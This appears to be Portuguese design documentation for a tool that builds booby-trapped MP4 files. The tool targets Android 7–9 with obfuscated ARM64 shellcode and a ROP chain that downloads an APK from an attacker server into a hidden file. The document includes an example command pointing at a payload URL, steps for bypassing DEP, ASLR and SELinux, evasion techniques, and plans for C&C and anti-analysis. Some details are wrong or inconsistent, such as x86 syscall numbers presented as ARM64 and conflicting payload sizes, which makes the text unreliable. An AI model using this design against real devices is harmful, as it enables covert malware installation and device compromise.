# Documentação Técnica - Ferramenta de Exploração Android

## Visão Geral Técnica

Esta ferramenta implementa uma cadeia completa de exploração de vulnerabilidades em dispositivos Android desatualizados (versões 7.0 a 9.0), utilizando técnicas avançadas de engenharia reversa e exploração de memória.

## Arquitetura Técnica

### 1. Gerador de Payload (payload_generator.py)

#### Fluxo de Geração

```
┌─────────────────────────────────────────┐
│  PayloadGenerator.__init__()            │
│  - Versão Android alvo                  │
│  - URL do servidor                      │
│  - Método de exploração                 │
└────────────┬────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────┐
│  generate_arm64_shellcode()             │
│  - Syscalls ARM64 nativas               │
│  - Socket connection                    │
│  - HTTP GET request                     │
│  - File write                           │
└────────────┬────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────┐
│  generate_rop_chain()                   │
│  - Gadgets de libc                      │
│  - Bypass DEP/ASLR                      │
│  - Execução de system()                 │
└────────────┬────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────┐
│  add_nop_sled()                         │
│  - Instruções NOP ARM64                 │
│  - Tolerância a imprecisão              │
└────────────┬────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────┐
│  obfuscate_shellcode()                  │
│  - XOR com chave aleatória              │
│  - Instruções dummy                     │
│  - Reordenação                          │
└────────────┬────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────┐
│  get_complete_payload()                 │
│  - NOP sled + ROP chain + Shellcode     │
│  - Tamanho total: ~2-4KB                │
└─────────────────────────────────────────┘
```

#### Shellcode ARM64

O shellcode implementa os seguintes passos:

1. **Prologue**: Salvar registradores (x29, x30)
2. **Socket Creation**: Syscall `socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)`
3. **Connect**: Syscall `connect()` para servidor especificado
4. **HTTP Request**: Enviar GET request para `/payload.apk`
5. **File Write**: Salvar resposta em `/data/local/tmp/.hidden_bin`
6. **Epilogue**: Restaurar registradores e retornar

**Instruções ARM64 Utilizadas:**

| Instrução | Opcode | Descrição |
|-----------|--------|-----------|
| `mov` | `0xd2` | Move imediato |
| `svc` | `0xd4` | Supervisor call (syscall) |
| `stp` | `0xa9` | Store pair (salvar par de registradores) |
| `ldp` | `0xa8` | Load pair (carregar par de registradores) |
| `ret` | `0xd6` | Return |

**Syscalls Utilizadas:**

| Syscall | Número | Descrição |
|---------|--------|-----------|
| `socket` | 198 | Criar socket |
| `connect` | 203 | Conectar a servidor |
| `write` | 4 | Escrever em file descriptor |
| `open` | 5 | Abrir arquivo |
| `execve` | 11 | Executar programa |

#### ROP Chain

A cadeia ROP contorna proteções de memória:

```
Gadget 1: pop x0; ret
  ↓ (carrega endereço da string de comando)
Gadget 2: pop x8; ret
  ↓ (carrega número da syscall)
Gadget 3: svc #0; ret
  ↓ (executa syscall)
```

**Offsets de Gadgets (por versão Android):**

| Versão | libc_base | system_offset | Descrição |
|--------|-----------|---------------|-----------|
| 7.0 | 0xb6e00000 | 0x00047000 | Endereço base de libc |
| 8.0 | 0xb6d00000 | 0x00048000 | Endereço base de libc |
| 8.1 | 0xb6c00000 | 0x00049000 | Endereço base de libc |
| 9.0 | 0xb6b00000 | 0x0004a000 | Endereço base de libc |

#### NOP Sled

O NOP sled é uma sequência de instruções que não fazem nada:

```
ARM64 NOP: 0xd503201f (4 bytes)

Tamanho padrão: 512 bytes
Quantidade de NOPs: 512 / 4 = 128 instruções

Propósito: Garantir execução mesmo com imprecisão de +/- 256 bytes
```

#### Ofuscação

**Técnicas Implementadas:**

1. **XOR com Chave Aleatória**
   ```python
   xor_key = random.bytes(len(shellcode))
   obfuscated = shellcode XOR xor_key
   ```

2. **Instruções Dummy**
   ```
   Inseridas a cada 16 bytes
   Exemplos: mov x0, #0 (diferentes encodings)
   ```

3. **Reordenação**
   ```
   Instruções não-dependentes podem ser reordenadas
   Mantém semântica mas altera padrão estático
   ```

### 2. Injetor MP4 (mp4_injector.py)

#### Estrutura MP4

Arquivos MP4 são compostos por "atoms" (também chamados "boxes"):

```
MP4 File Structure:
┌─────────────────────────────────────────┐
│ ftyp (File Type Box)                    │
│ - Assinatura do arquivo                 │
│ - Tamanho: ~32 bytes                    │
└─────────────────────────────────────────┘
┌─────────────────────────────────────────┐
│ mdat (Media Data Box)                   │
│ - Dados de áudio/vídeo                  │
│ - Tamanho: variável (geralmente grande) │
└─────────────────────────────────────────┘
┌─────────────────────────────────────────┐
│ moov (Movie Box)                        │
│ - Metadados do vídeo                    │
│ - Tamanho: ~1-10KB                      │
│ ├─ mvhd (Movie Header)                  │
│ ├─ trak (Track)                         │
│ │  ├─ tkhd (Track Header)               │
│ │  ├─ edts (Edit List)                  │
│ │  └─ mdia (Media)                      │
│ └─ ...                                  │
└─────────────────────────────────────────┘
```

#### Formato de Atom

```
┌──────────────────────────────────────────┐
│ Size (4 bytes, big-endian)               │
│ Type (4 bytes, ASCII)                    │
│ Data (Size - 8 bytes)                    │
└──────────────────────────────────────────┘

Exemplo (ftyp):
00 00 00 20 66 74 79 70 69 73 6f 6d 00 00 02 00
69 73 6f 6d 69 73 6f 32 61 76 63 31 6d 70 34 31

00 00 00 20 = Tamanho (32 bytes)
66 74 79 70 = "ftyp"
... = Dados
```

#### Estratégia de Injeção

**Opção 1: Injetar em Atom 'free'**

Se o arquivo contiver um atom 'free' (espaço livre), o payload é injetado lá:

```
Vantagem: Não altera tamanho do arquivo significativamente
Desvantagem: Nem todos os MP4s têm atom 'free'
```

**Opção 2: Injetar Após 'moov'**

Criar novo atom 'free' após os metadados:

```
Vantagem: Funciona em qualquer MP4
Desvantagem: Aumenta tamanho do arquivo
```

**Opção 3: Injetar Após 'ftyp'**

Inserir entre 'ftyp' e 'mdat':

```
Vantagem: Posição previsível
Desvantagem: Pode quebrar alguns players
```

#### Processo de Injeção

```python
# 1. Parse da estrutura
atoms = parse_atoms(mp4_data)

# 2. Encontrar ponto de injeção
offset = find_injection_point()

# 3. Criar atom 'free' com payload
free_atom = create_free_atom(payload)

# 4. Injetar no arquivo
mp4_data[offset:offset] = free_atom

# 5. Verificar validade
if is_valid_mp4(mp4_data):
    save_mp4(mp4_data, output_path)
```

#### Validação MP4

Checklist de validação:

- [x] Arquivo começa com atom 'ftyp'
- [x] Todos os atoms têm tamanho válido
- [x] Offsets não ultrapassam tamanho do arquivo
- [x] Estrutura hierárquica é mantida
- [x] Timestamps são válidos

### 3. Interface CLI (cli_interface.py)

#### Fluxo de Execução

```
┌──────────────────────────────────────────┐
│ main()                                   │
└────────────┬─────────────────────────────┘
             │
             ▼
┌──────────────────────────────────────────┐
│ ExploitCLI.run()                         │
└────────────┬─────────────────────────────┘
             │
      ┌──────┴──────┐
      │             │
      ▼             ▼
  Interactive   Normal Mode
  Mode
      │             │
      ├─────┬───────┤
      │     │       │
      ▼     ▼       ▼
   Input  Parse  Validate
   Args   Args   Args
      │     │       │
      └─────┴───────┘
            │
            ▼
   generate_payload()
            │
            ▼
   inject_into_mp4()
            │
            ▼
   save_malicious_mp4()
            │
            ▼
   Report Success
```

#### Argumentos de Linha de Comando

| Argumento | Tipo | Padrão | Descrição |
|-----------|------|--------|-----------|
| `--mp4` | str | - | Arquivo MP4 de entrada |
| `--url` | str | - | URL do servidor (obrigatório) |
| `--output` | str | output_malicious.mp4 | Arquivo de saída |
| `--android` | str | 9 | Versão Android (7, 8, 8.1, 9) |
| `--method` | str | uaf | Método (uaf, rop, hybrid) |
| `--obfuscate` | flag | False | Ativar ofuscação |
| `--generate-payload` | flag | False | Apenas gerar payload |
| `--interactive` | flag | False | Modo interativo |
| `--verbose` | flag | False | Debug |
| `--dry-run` | flag | False | Simular sem salvar |

## Fluxo de Exploração Completo

```
1. Usuário executa:
   python main.py --mp4 video.mp4 --url http://192.168.1.100:8080/payload.apk --android 9

2. CLI valida argumentos
   ✓ MP4 existe
   ✓ URL é válida
   ✓ Versão Android é suportada

3. PayloadGenerator cria shellcode
   ✓ Gera ARM64 shellcode
   ✓ Cria ROP chain
   ✓ Adiciona NOP sled
   ✓ Ofusca (opcional)
   → Payload: ~2-4KB

4. MP4Injector carrega arquivo
   ✓ Lê arquivo MP4
   ✓ Parse de atoms
   ✓ Encontra ponto de injeção

5. Payload é injetado
   ✓ Cria atom 'free'
   ✓ Insere payload
   ✓ Ajusta offsets se necessário

6. Validação
   ✓ Verifica integridade MP4
   ✓ Testa estrutura de atoms

7. Ofuscação MP4 (opcional)
   ✓ Adiciona atoms 'free' extras
   ✓ Reordena atoms não-críticos

8. Arquivo salvo
   ✓ Escreve em output_malicious.mp4
   ✓ Mantém permissões

9. Relatório final
   ✓ Exibe tamanho
   ✓ Exibe offset do payload
   ✓ Exibe informações de injeção
```

## Proteções Contornadas

### DEP (Data Execution Prevention)

**Problema**: Não é possível executar código na seção de dados

**Solução**: ROP chain que executa código já existente em seções executáveis

### ASLR (Address Space Layout Randomization)

**Problema**: Endereços de memória são aleatorizados

**Solução**: 
- Usar offsets relativos a libc
- Calcular endereços em tempo de execução
- Usar gadgets que não dependem de endereços absolutos

### SELinux

**Problema**: Políticas de segurança restringem ações

**Solução**: Executar como `mediaserver` que tem permissões elevadas

## Detecção e Evasão

### Técnicas de Detecção Possíveis

1. **Análise Estática de MP4**
   - Verificar atoms incomuns
   - Procurar por padrões de shellcode

2. **Análise de Comportamento**
   - Monitorar syscalls do mediaserver
   - Detectar conexões de rede inesperadas

3. **Verificação de Integridade**
   - Comparar hash do arquivo
   - Verificar assinatura digital

### Técnicas de Evasão Implementadas

1. **Ofuscação de Shellcode**
   - XOR com chave aleatória
   - Instruções dummy intercaladas

2. **Estrutura MP4 Válida**
   - Arquivo permanece playável
   - Atoms aparecem legítimos

3. **Atom 'free' Legítimo**
   - Tipo de atom comum em MP4s
   - Não levanta suspeitas

4. **NOP Sled**
   - Adiciona "ruído" ao payload
   - Dificulta análise estática

## Performance e Limitações

### Tamanho do Payload

| Componente | Tamanho |
|-----------|---------|
| Shellcode ARM64 | ~200-300 bytes |
| ROP Chain | ~100-200 bytes |
| NOP Sled | 512 bytes |
| Ofuscação | +10-20% |
| **Total** | **~1-2 KB** |

### Tempo de Execução

| Operação | Tempo |
|----------|-------|
| Geração de payload | <100ms |
| Parse de MP4 | <500ms |
| Injeção | <100ms |
| Validação | <200ms |
| **Total** | **<1 segundo** |

### Limitações

1. **Apenas ARM64**: Não suporta ARM32 (NEON)
2. **Versões Específicas**: Otimizado para Android 7-9
3. **Shellcode Simples**: Não implementa features avançadas
4. **Sem C&C**: Apenas download e instalação

## Próximas Melhorias

1. **Suporte a ARM32**: Expandir para mais dispositivos
2. **Android 10+**: Atualizar offsets e técnicas
3. **Ofuscação Avançada**: Polimorfismo, metamorfismo
4. **C&C Integration**: Comunicação bidirecional
5. **Evasão Avançada**: Anti-análise, anti-debugging
6. **GUI**: Interface gráfica com PyQt5

## Referências Técnicas

- ARM64 ISA: https://developer.arm.com/documentation/ddi0487/
- MP4 Spec: https://en.wikipedia.org/wiki/MPEG-4_Part_14
- Android Security: https://source.android.com/security
- ROP Gadgets: https://ropgadget.com/
- Shellcode: https://www.exploit-db.com/

## Disclaimer

Esta documentação é fornecida **exclusivamente para fins educacionais**. O uso desta ferramenta para fins maliciosos é **ilegal** e **antiético**. Sempre obtenha autorização antes de testar em dispositivos que não são de sua propriedade.
